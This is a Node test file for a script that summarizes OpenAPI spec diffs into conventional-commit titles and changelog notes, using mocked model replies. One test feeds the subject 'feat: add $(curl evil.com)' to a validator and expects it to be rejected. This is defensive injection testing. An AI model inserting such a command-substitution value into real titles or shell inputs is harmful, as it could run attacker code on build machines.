import assert from 'node:assert/strict'
import { execFile } from 'node:child_process'
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { test } from 'node:test'
import { promisify } from 'node:util'
import { fileURLToPath } from 'node:url'

import {
  acceptSubject,
  buildPayload,
  collapseChanges,
  fallbackTitle,
  isNoiseChange,
  MODEL_ID,
  summarize,
  writeGithubOutput,
} from './summarize-spec-diff.mjs'

const execFileAsync = promisify(execFile)
const here = path.dirname(fileURLToPath(import.meta.url))
const fixtures = path.join(here, 'fixtures')

let oasdiffBin

async function ensureOasdiff() {
  if (oasdiffBin) return oasdiffBin
  if (process.env.OASDIFF_BIN) {
    oasdiffBin = process.env.OASDIFF_BIN
    return oasdiffBin
  }
  const bundled = '/tmp/oasdiff'
  try {
    await execFileAsync(bundled, ['--version'])
    oasdiffBin = bundled
    return oasdiffBin
  } catch {
    // Download the pinned release the action installs.
  }
  const dir = mkdtempSync(path.join(tmpdir(), 'oasdiff-'))
  const archive = path.join(dir, 'oasdiff.tar.gz')
  const version = '1.33.0'
  const arch = process.arch === 'arm64' ? 'linux_arm64' : 'linux_amd64'
  await execFileAsync('curl', [
    '-fsSL',
    '-o',
    archive,
    `https://github.com/oasdiff/oasdiff/releases/download/v${version}/oasdiff_${version}_${arch}.tar.gz`,
  ])
  await execFileAsync('tar', ['-xzf', archive, '-C', dir])
  oasdiffBin = path.join(dir, 'oasdiff')
  return oasdiffBin
}

function loadPair(name) {
  const dir = path.join(fixtures, name)
  return {
    previousPath: path.join(dir, 'before.json'),
    currentPath: path.join(dir, 'after.json'),
    previous: JSON.parse(readFileSync(path.join(dir, 'before.json'), 'utf8')),
    current: JSON.parse(readFileSync(path.join(dir, 'after.json'), 'utf8')),
  }
}

async function payloadFor(name) {
  const pair = loadPair(name)
  const bin = await ensureOasdiff()
  const changelog = JSON.parse(await execText(bin, ['changelog', pair.previousPath, pair.currentPath, '--format', 'json']))
  let breaking = []
  const breakingText = await execText(bin, ['breaking', pair.previousPath, pair.currentPath, '--format', 'json'])
  if (breakingText.trim()) breaking = JSON.parse(breakingText)
  return buildPayload({
    previous: pair.previous,
    current: pair.current,
    changelog,
    breaking,
    methods: '+ client.workflows.upsert()\nnoise that is not a method\n',
    specLabel: 'mapi',
    version: 'v0.1.1696',
  })
}

function execText(bin, args) {
  return execFileAsync(bin, args, { maxBuffer: 8 * 1024 * 1024 }).then((result) => result.stdout)
}

function toolResponse(input) {
  return async () => new Response(JSON.stringify({
    content: [{ type: 'tool_use', name: 'changelog_summary', input }],
  }), { status: 200, headers: { 'content-type': 'application/json' } })
}

test('reusable_request bump keeps the enum and drops unrelated schemas', async () => {
  const payload = await payloadFor('reusable-request')
  const encoded = JSON.stringify(payload)
  assert.match(encoded, /reusable_request/)
  assert.match(encoded, /getCommit/)
  assert.match(encoded, /Get a commit/)
  assert.doesNotMatch(encoded, /UnrelatedWidget/)
  assert.doesNotMatch(encoded, /DESCRIPTION_SENTINEL/)
  assert.equal(payload.changes.length, 1)
  assert.ok(payload.breaking.length >= 1)
})

test('delay time window bump keeps the property and new schema', async () => {
  const payload = await payloadFor('delay-time-window')
  const encoded = JSON.stringify(payload)
  assert.match(encoded, /delay_until_time_windows/)
  assert.match(encoded, /DelayTimeWindow/)
  assert.match(encoded, /upsertWorkflow/)
  assert.doesNotMatch(encoded, /UnrelatedWidget/)
  assert.doesNotMatch(encoded, /DESCRIPTION_SENTINEL/)
  assert.doesNotMatch(encoded, /Both fields can be set to compute a delay/)
  assert.ok(payload.changes.length > 0)
  assert.ok(payload.changes.length <= 4)
  assert.ok(payload.schemas.added.some((schema) => schema.name === 'DelayTimeWindow'))
  assert.ok(payload.schemas.properties_added.some((prop) => prop.path.endsWith('delay_until_time_windows')))
})

test('description and example edits are not behavioral changes', async () => {
  const payload = await payloadFor('description-only')
  const encoded = JSON.stringify(payload)
  assert.equal(payload.changes.length, 0)
  assert.equal(payload.schemas.added.length, 0)
  assert.equal(payload.schemas.properties_added.length, 0)
  assert.doesNotMatch(encoded, /DESCRIPTION_SENTINEL/)
  assert.doesNotMatch(encoded, /NEW_OP_DESCRIPTION/)

  let called = false
  const result = await summarize({
    previous: path.join(fixtures, 'description-only', 'before.json'),
    current: path.join(fixtures, 'description-only', 'after.json'),
    oasdiff: await ensureOasdiff(),
    specLabel: 'mapi',
    version: 'v0.1.1696',
    apiKey: 'test-key',
    fetchImpl: async () => {
      called = true
      return new Response('{}', { status: 200 })
    },
  })
  assert.equal(called, false)
  assert.equal(result.title, fallbackTitle('mapi', 'v0.1.1696'))
  assert.equal(result.bodyNotes, '')
  assert.equal(result.usedFallback, true)
})

test('noise ids are dropped before the model sees the diff', () => {
  assert.equal(isNoiseChange({ id: 'api-schema-description-changed' }), true)
  assert.equal(isNoiseChange({ id: 'api-schema-example-updated' }), true)
  assert.equal(isNoiseChange({ id: 'new-optional-request-property' }), false)

  const collapsed = collapseChanges([
    { id: 'api-property-description-changed', text: 'rewrote DESCRIPTION_SENTINEL_NEW', level: 1 },
    { id: 'api-schema-example-updated', text: 'replaced the example', level: 1 },
    {
      id: 'response-property-enum-value-added',
      text: 'added the new `reusable_request` enum value to the `type` response property',
      level: 3,
      operation: 'GET',
      operationId: 'getCommit',
      path: '/v1/commits/{id}',
    },
  ])
  assert.equal(collapsed.changes.length, 1)
  assert.match(collapsed.changes[0].text, /reusable_request/)
  assert.doesNotMatch(JSON.stringify(collapsed), /DESCRIPTION_SENTINEL/)
})

test('repeated enum additions collapse to one change', () => {
  const collapsed = collapseChanges([
    { id: 'response-property-enum-value-added', text: 'added `reusable_request` to `entries/items/resource/type`', level: 3, operationId: 'listCommits', operation: 'GET', path: '/v1/commits' },
    { id: 'response-property-enum-value-added', text: 'added `reusable_request` to `resource/type`', level: 3, operationId: 'getCommit', operation: 'GET', path: '/v1/commits/{id}' },
    { id: 'response-property-enum-value-added', text: 'added `reusable_request` to `commit/resource/type`', level: 3, operationId: 'promoteOneCommit', operation: 'PUT', path: '/v1/commits/{id}/promote' },
  ])
  assert.equal(collapsed.changes.length, 1)
  assert.equal(collapsed.changes[0].operations.length, 3)
  assert.equal(collapsed.changes[0].text, 'added `reusable_request` to `resource/type`')
})

test('invalid, empty, and failed model replies fall back to the version title', async () => {
  const bin = await ensureOasdiff()
  const base = {
    previous: path.join(fixtures, 'delay-time-window', 'before.json'),
    current: path.join(fixtures, 'delay-time-window', 'after.json'),
    oasdiff: bin,
    specLabel: 'mapi',
    version: 'v0.1.1696',
    apiKey: 'test-key',
  }
  const fallback = fallbackTitle('mapi', 'v0.1.1696')

  const invalid = await summarize({
    ...base,
    fetchImpl: async () => new Response(JSON.stringify({
      content: [{ type: 'text', text: 'I changed some endpoints.' }],
    }), { status: 200 }),
  })
  assert.equal(invalid.title, fallback)
  assert.equal(invalid.usedFallback, true)
  assert.match(invalid.bodyNotes, /delay_until_time_windows/)
  assert.match(invalid.bodyNotes, /DelayTimeWindow/)

  const empty = await summarize({
    ...base,
    fetchImpl: toolResponse({ subject: '', bullets: [], breaking: false }),
  })
  assert.equal(empty.title, fallback)
  assert.match(empty.bodyNotes, /fell back/)

  const crashed = await summarize({
    ...base,
    fetchImpl: async () => new Response('upstream blew up', { status: 500 }),
  })
  assert.equal(crashed.title, fallback)
  assert.equal(crashed.usedFallback, true)
  assert.match(crashed.bodyNotes, /delay_until_time_windows/)
})

test('a valid summary becomes the title and a breaking prefix is never kept', async () => {
  const bin = await ensureOasdiff()
  const result = await summarize({
    previous: path.join(fixtures, 'delay-time-window', 'before.json'),
    current: path.join(fixtures, 'delay-time-window', 'after.json'),
    oasdiff: bin,
    specLabel: 'mapi',
    version: 'v0.1.1696',
    apiKey: 'test-key',
    methods: '+ client.workflows.upsert()\n',
    fetchImpl: toolResponse({
      subject: 'feat!: delay steps can wait for a weekly time window',
      bullets: ['add delay_until_time_windows on delay steps', 'add the DelayTimeWindow type', '', 'six', 'seven', 'eight', 'nine'],
      breaking: true,
    }),
  })
  assert.equal(result.title, 'feat: delay steps can wait for a weekly time window (v0.1.1696)')
  assert.doesNotMatch(result.title, /feat!:/)
  assert.equal(result.usedFallback, false)
  assert.match(result.bodyNotes, /^- add delay_until_time_windows on delay steps$/m)
  assert.match(result.bodyNotes, /^- eight$/m)
  assert.doesNotMatch(result.bodyNotes, /^- nine$/m)
})

test('enum bumps warn about breaking changes without a major prefix', async () => {
  const result = await summarize({
    previous: path.join(fixtures, 'reusable-request', 'before.json'),
    current: path.join(fixtures, 'reusable-request', 'after.json'),
    oasdiff: await ensureOasdiff(),
    specLabel: 'mapi',
    version: 'v0.1.1700',
    apiKey: 'test-key',
    fetchImpl: toolResponse({
      subject: 'feat: commits can record reusable requests',
      bullets: ['add the reusable_request resource type'],
      breaking: true,
    }),
  })
  assert.equal(result.title, 'feat: commits can record reusable requests (v0.1.1700)')
  assert.equal(result.breaking, true)
  assert.match(result.bodyNotes, /Retitle to `feat!:`/)
  assert.match(result.bodyNotes, /reusable_request/)
})

test('missing model key keeps the version title and still describes the diff', async () => {
  let called = false
  const result = await summarize({
    previous: path.join(fixtures, 'delay-time-window', 'before.json'),
    current: path.join(fixtures, 'delay-time-window', 'after.json'),
    oasdiff: await ensureOasdiff(),
    specLabel: 'mapi',
    version: 'v0.1.1696',
    apiKey: '',
    fetchImpl: async () => {
      called = true
      return new Response('{}', { status: 200 })
    },
  })
  assert.equal(called, false)
  assert.equal(result.title, 'feat: update mapi spec to v0.1.1696')
  assert.match(result.bodyNotes, /No changelog model key/)
  assert.match(result.bodyNotes, /DelayTimeWindow/)
})

test('the changelog request uses Haiku 5.5 without a temperature', async () => {
  let body
  await summarize({
    previous: path.join(fixtures, 'delay-time-window', 'before.json'),
    current: path.join(fixtures, 'delay-time-window', 'after.json'),
    oasdiff: await ensureOasdiff(),
    specLabel: 'mapi',
    version: 'v0.1.1696',
    apiKey: 'test-key',
    fetchImpl: async (_url, init) => {
      body = JSON.parse(init.body)
      return toolResponse({
        subject: 'feat: delay steps can wait for a weekly time window',
        bullets: ['add delay_until_time_windows on delay steps'],
        breaking: false,
      })()
    },
  })
  assert.equal(body.model, MODEL_ID)
  assert.equal(MODEL_ID, 'claude-haiku-5-5')
  assert.equal(body.temperature, undefined)
  assert.equal(body.top_p, undefined)
  assert.equal(body.output_config.effort, 'low')
  assert.equal(body.tool_choice.type, 'tool')
})

test('subjects that are too short, too long, or not conventional commits are rejected', () => {
  assert.equal(acceptSubject('feat: hi'), null)
  assert.equal(acceptSubject('chore: add delay windows'), null)
  assert.equal(acceptSubject(`feat: ${'a'.repeat(101)}`), null)
  assert.equal(acceptSubject('feat: add $(curl evil.com)'), null)
  assert.equal(acceptSubject('feat!: delay steps can wait for a weekly time window'), 'feat: delay steps can wait for a weekly time window')
})

test('github output keeps a multiline body intact', () => {
  const file = path.join(mkdtempSync(path.join(tmpdir(), 'gh-out-')), 'output.txt')
  writeFileSync(file, '')
  writeGithubOutput(file, {
    title: 'feat: delay steps can wait for a weekly time window (v0.1.1696)',
    'body-notes': '## API changes\n\n- add delay windows\n',
    breaking: 'false',
    fallback: 'false',
  })
  const text = readFileSync(file, 'utf8')
  assert.match(text, /^title=feat: delay steps can wait for a weekly time window \(v0\.1\.1696\)/m)
  assert.match(text, /body-notes<<SPEC_DIFF_/)
  assert.match(text, /## API changes/)
  assert.match(text, /breaking=false/)
})
